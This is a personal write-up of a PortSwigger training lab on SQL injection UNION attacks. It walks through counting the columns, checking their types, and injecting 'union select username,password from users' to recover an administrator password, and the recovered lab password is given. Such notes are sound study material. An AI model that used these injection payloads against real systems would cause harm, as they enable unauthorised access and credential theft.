# SQL injection UNION attack, retrieving data from other tables

## description

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

**The database contains a different table called `users`, with columns called `username` and `password`.**

To solve the lab, perform an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.



## Analytics

1. First,we need to find how many columns inside the testing table. This topic can refer to [[lab3]].
2. Second,find each column's data type is string or not, find useful injection point. This topic is related to [[lab4]].
3. use `union select` add data from another table.

<br>

```sql

select * from test_table where category = '
	Gifts' union select null,null..... -- 
'

```



## Solving process


1. find out column numbers : 2 ![[Pasted image 20211019180713.png]]
2. find out data types. These two columns are all string type.![[Pasted image 20211019180834.png]]
3. add union select statement to get data from `users` table.![[Pasted image 20211019181409.png]]

<br>

Added sql query
```sql
union select username,password from users where username = 'administrator'
```
<br>

User `administrator`'s password is `gj7x38uvs58sre3lwodu`.

<br>

related lab : [[lab3]] , [[lab4]]
<br>

related topic: [[union attacks]]

